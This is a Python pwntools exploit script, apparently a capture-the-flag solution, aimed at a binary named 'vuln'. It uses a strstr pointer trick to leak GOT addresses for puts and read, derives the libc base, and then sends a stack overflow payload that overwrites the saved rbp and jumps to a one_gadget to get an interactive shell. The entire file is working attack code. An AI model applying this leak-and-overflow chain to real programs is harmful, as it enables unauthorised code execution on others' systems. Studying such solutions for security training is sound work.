#!/usr/bin/env python3

# type: ignore
# flake8: noqa

from pwn import *

elf = context.binary = ELF("./vuln")
libc = ELF("./libc.so")


def start(argv=[], *a, **kw):
    host = args.HOST or 'localhost'
    port = int(args.PORT or 1337)
    if args.REMOTE:
        return remote(host, port)
    else:
        return process([elf.path] + argv, env=env, *a, **kw)


env = {}
io = start()


def leak(addr):
    # set `bones` to point to memory address to be searched with `strstr`
    payload = b"dev" + p64(addr)
    io.sendafter(b"bone:\n", payload)

    # force `strstr` to compare with NULL byte which surprisingly returns true
    # and causes the program to print the matching string
    payload = b"\x00"
    io.sendafter(b"bone:\n", payload)
    io.recvline()
    leaked = u64(io.recvline().strip().ljust(8, b"\x00"))
    return leaked


leak_puts = leak(elf.got["puts"])
log.info(f"{leak_puts=:#x}")
leak_read = leak(elf.got["read"])
log.info(f"{leak_read=:#x}")

libc.address = leak_puts - libc.symbols["puts"]

"""
constraints:
r10 == NULL which is satisfiable due to this line
0x401321 <vuln+246>       xor    r10, r10

[rbp-0x70] == NULL
[rbp-0x78] == NULL
"""
one_gadget = libc.address + 0xebcf1

pad = 0x50

payload = b"A" * pad
payload += p64(elf.bss(0x200))  # rbp
payload += p64(one_gadget)
io.sendafter(b"bone:\n", payload)


io.interactive()
